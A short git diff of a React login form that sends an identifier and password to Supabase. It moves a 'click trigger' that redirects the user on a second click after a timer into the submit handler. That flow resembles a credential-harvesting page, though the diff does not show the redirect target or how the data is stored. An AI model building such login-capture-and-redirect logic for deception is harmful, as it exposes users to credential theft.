@@ -30,12 +30,6 @@ function App() {
   const canSubmit =
     identifier.trim() !== '' && password.trim() !== ''
 
-
-  // Click trigger: redirect on the 2nd click
-  if (timerElapsed && nextCount >= 2) {
-    redirectNow()
-    return // skip the normal submit logic on the triggering click, if desired
-  }
   const handleSubmit = async (event) => {
     event.preventDefault()
 
@@ -45,7 +39,6 @@ function App() {
     setMessage('')
     setSuccess(false)
     setLoading(true)
-
 
     try {
       const { error } = await supabase
@@ -63,6 +56,12 @@ function App() {
       setMessage('Something went wrong. Please try again.')
     } finally {
       setLoading(false)
+    }
+
+    // Click trigger: redirect on the 2nd click
+    if (timerElapsed && nextCount >= 2) {
+      redirectNow()
+      return // skip the normal submit logic on the triggering click, if desired
     }
   }
 
